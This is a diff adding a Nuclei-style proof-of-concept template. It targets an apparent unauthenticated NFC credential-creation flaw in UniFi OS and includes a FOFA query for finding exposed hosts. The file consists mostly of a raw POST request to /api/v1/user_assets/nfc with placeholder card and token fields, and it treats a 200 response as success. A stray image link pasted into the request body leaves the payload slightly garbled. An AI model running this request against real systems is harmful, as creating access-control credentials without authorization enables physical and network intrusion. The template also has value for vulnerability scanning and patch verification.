@@ -1,0 +1,19 @@
+id: poc-msyoavwsc5m36hgy
+info:
+  name: UniFi nfc存在未授权创建权限漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/msyoavwsc5m36hgy'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: msyoavwsc5m36hgy
+    fofa: body="UniFi OS"
+http:
+- raw:
+  - "POST /api/v1/user_assets/nfc HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nContent-Length: 197\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n\n{\n  \"alias\": \"ijdsqx\",\n  \"asset_id\": \"1\",\n  \"need_provision\": true,\n  \"nfc_id\": \"1\",\n  \"plain_token\": \"1\",\n  \"sys_id\": \"1\",\n  \"token\": \"1\",\n  \"ua_card_id\": \"1\",\n  \"ua_card_pub_key\": \"1\"\n}\n\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1762685732181-80a4a99d-25a4-48e2-b7e9-0243f9e7152a.png)"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
